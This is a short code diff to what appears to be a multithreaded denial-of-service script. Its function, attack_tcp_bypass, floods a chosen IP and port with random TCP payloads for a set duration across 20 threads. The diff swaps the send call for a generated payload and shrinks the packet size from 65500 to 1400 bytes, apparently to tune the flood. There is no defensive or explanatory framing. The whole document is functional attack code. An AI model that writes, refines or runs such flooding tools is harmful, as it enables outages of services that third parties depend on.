@@ -125,7 +125,8 @@ def attack_tcp_bypass(ip, port, end_time, size):
             s.connect((ip, port))
             packets_sent = 0
             while time.time() < end_time and packets_sent < max_packets:
-                s.send(random._urandom(size))
+                data = generate_random_payload(size)
+                s.sendto(data, (ip, port))
                 packets_sent += 1
         except:
             pass
@@ -210,7 +211,7 @@ def main():
                     port = int(args[2])
                     duration = int(args[3])
                     end_time = time.time() + duration
-                    size = 65500
+                    size = 1400
                     threads = 20
 
                     for _ in range(threads):
@@ -220,7 +221,7 @@ def main():
                     port = int(args[2])
                     duration = int(args[3])
                     end_time = time.time() + duration
-                    size = 65500
+                    size = 1400
                     threads = 20
 
                     for _ in range(threads):
